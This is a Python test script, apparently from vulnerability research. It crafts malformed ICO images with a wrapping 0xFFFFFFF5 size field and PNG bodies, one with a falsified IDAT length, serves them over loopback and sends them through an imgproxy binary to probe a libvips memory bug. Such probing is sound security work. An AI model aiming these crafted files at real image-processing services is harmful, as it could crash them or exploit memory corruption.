#!/usr/bin/env python3
"""W7: wrapped data_size ICO with pattern/PNG-magic body, loopback only.

Usage: ico_readfull_bound.py BINARY LIBDIR TAG REQUEST_PATH [TIMEOUT]
Tests whether a PNG-magic body reaches PNG decode on the wrapped 3-byte
allocation; vips_foreign_load_read_full requires the full 4 GiB length.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import threading
import time
import zlib

SRC_HOST, SRC_PORT = "127.0.0.1", 18081
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18080


def chunk(kind, data):
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))


IHDR = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
IDAT_DATA = zlib.compress(b"\x00\xff\x00\x00")
IDAT = chunk(b"IDAT", IDAT_DATA)
IEND = chunk(b"IEND", b"")
SIG = b"\x89PNG\r\n\x1a\n"

# IDAT whose declared length lies: libpng must consume past the supplied bytes.
LIE = struct.pack(">I", 4096) + b"IDAT" + IDAT_DATA + struct.pack(">I", 0)


def ico(body):
    header = b"\x00\x00\x01\x00\x01\x00"
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
    return header + entry + body


FILES = {
    "/pattern.ico": ico(bytes([0x5A, 0x5B, 0x5C, 0x5D] * 8)),
    "/pngvalid.ico": ico(SIG + IHDR + IDAT + IEND),
    "/pnglie.ico": ico(SIG + IHDR + LIE),
    "/pngihdr.ico": ico(SIG + IHDR),
}


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = FILES.get(self.path)
        if body is None:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def wait_port(host, port, seconds=12.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def main():
    binary, libdir, tag, request_path = sys.argv[1:5]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 8.0
    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    env = dict(os.environ)
    env.update({
        "IMGPROXY_BIND": f"{PROXY_HOST}:{PROXY_PORT}",
        "IMGPROXY_BASE_URL": f"http://{SRC_HOST}:{SRC_PORT}/",
        "IMGPROXY_WORKERS": "1", "IMGPROXY_CONCURRENCY": "1",
        "IMGPROXY_LOG_LEVEL": "info", "LD_LIBRARY_PATH": libdir,
        "IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES": "true",
    })
    logpath = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           f"http-ico-{tag}.log")
    log = open(logpath, "wb")
    proc = subprocess.Popen([binary], env=env, stdout=log, stderr=subprocess.STDOUT)
    status, body, err = "-", b"", ""
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"PNGPROBE tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        started = time.monotonic()
        try:
            conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
            conn.request("GET", f"/insecure/{request_path}", headers={"Host": PROXY_HOST})
            resp = conn.getresponse()
            status = resp.status
            body = resp.read(600)
            conn.close()
        except Exception as exc:
            err = f"{type(exc).__name__}: {exc}"
        elapsed = time.monotonic() - started
        time.sleep(0.3)
        rc = proc.poll()
        print(f"PNGPROBE tag={tag} path={request_path} status={status} "
              f"elapsed={elapsed:.3f} rc={rc} err={err!r} "
              f"len={len(body)} head={body[:80]!r} log={logpath}", flush=True)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
        log.flush()
        log.close()
        srv.shutdown()
        srv.server_close()
        with open(logpath, "rb") as f:
            lines = f.read().decode("utf-8", "replace").splitlines()
        for line in lines:
            if 'level="ERROR"' in line or "corrupted" in line or "png" in line.lower():
                print(f"PNGLOG tag={tag} {line[:400]}", flush=True)
                break
    return 0


if __name__ == "__main__":
    sys.exit(main())
